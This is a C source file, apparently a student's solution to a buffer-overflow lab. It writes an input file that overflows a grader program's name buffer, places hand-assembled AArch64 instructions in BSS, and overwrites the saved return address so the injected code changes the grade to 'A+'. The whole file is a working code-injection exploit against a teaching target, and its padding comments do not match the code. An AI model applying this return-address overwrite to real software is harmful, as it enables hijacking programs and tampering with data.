/**********************************************************************/
/* Author: Chimwemwe Chinkuyu                                         */
/* file: createdataAplus.c                                            */
/**********************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* Takes in no input and writes "Chimwemwe", a null byte, 'A', a null
 * byte, then 6 instructions that print ensure "A+ is your grade" is printed
 * by grader.c followed 11 null bytes for padding and one null
 * byte to overwrite getName's x30. Returns 0. */
int main(void) {
    FILE *psFile;
    unsigned int ulInstruction;
    unsigned long ulAddress;
    int i = 0;

    /* Open file dataAplus to write data into */
    psFile = fopen("dataAplus", "w");

    /* Write my name (Chimwemwe) to the file dataAplus followed
     * by three null bytes */
    fprintf(psFile, "Chimwemwe");
    putc('\0', psFile);

    /* Add 'A' followed by a null byte in BSS */
    fprintf(psFile, "A");
    putc('\0', psFile);

    /* Write the instruction that moves "A" string into the x0 register
     * in machine language to dataAplus */
    ulInstruction = MiniAssembler_adr(0, 0x420062, 0x420064);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that prints the string "A" to stdout
     * in machine language to dataAplus */
    ulInstruction = MiniAssembler_bl(0x400600, 0x420068);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that moves '+' into the x0 register
     * in machine language to dataAplus */
    ulInstruction = MiniAssembler_mov(0, '+');
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that puts the address of variable [grade]
     * into the x1 register in machine language to dataAplus */
    ulInstruction = MiniAssembler_adr(1, 0x420044, 0x420070);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that stores '+' in the [grade] variable
     * in machine language to dataAplus */
    ulInstruction = MiniAssembler_strb(0, 1);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that branches to the instruction in main
     * that prints the user's name and grade in machine language to
     * dataAplus */
    ulInstruction = MiniAssembler_b(0x400864, 0x420078);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* FillS up buf[] array with 12 null byte */
    for(; i < 20; i++) {
        putc('\0', psFile);
    }

    /* Write the unsigned long address (0x420064) of the mov
     * instruction in BSS to file dataAplus, overwriting getName's x30 */
    ulAddress = 0x420064;
    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
